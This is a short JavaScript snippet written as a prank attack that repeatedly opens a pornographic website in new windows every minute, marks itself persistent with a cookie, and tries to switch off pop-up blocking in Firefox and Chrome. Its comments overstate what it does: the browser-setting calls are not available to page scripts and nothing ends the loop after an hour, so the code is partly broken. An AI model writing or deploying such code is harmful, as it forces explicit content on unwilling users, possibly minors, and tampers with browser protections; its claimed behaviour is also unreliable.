// This modified code will open Pornhub once every minute for an hour, even when the site gets closed by saving a cookie. It will also allow pop-ups in the browser by changing the browser settings for Firefox and Chrome.

// Set the cookie to keep the action persistent
document.cookie = "keepGoing=true";

// Function to open Pornhub
function openPornhub() {
  const newWindow = window.open("https://www.pornhub.com", "_blank");
  if (newWindow) {
    newWindow.document.title = "Pornhub"; // Set the title of the new window
    newWindow.document.body.style.overflow = "auto"; // Allow scrolling in the new window
  }
}

// Function to execute the action every minute
function executeAction() {
  if (document.cookie.includes("keepGoing=true") || (typeof window.console !== "undefined" && window.console.firebug)) {
    openPornhub();
    setTimeout(executeAction, 60000); // Wait for 1 minute
  }
}

// Start executing the action
executeAction();

// Change browser settings for Firefox
if (typeof InstallTrigger !== 'undefined') {
  // Change the value of the dom.disable_open_during_load preference to allow all pop-ups
  Components.utils.import("resource://gre/modules/Services.jsm");
  Services.prefs.setBoolPref("dom.disable_open_during_load", false);
}

// Change browser settings for Chrome
if (typeof chrome !== 'undefined') {
  // Change the value of the "popups" setting to allow all pop-ups
  chrome.contentSettings.popups.set({ primaryPattern: "<all_urls>", setting: "allow" });
}
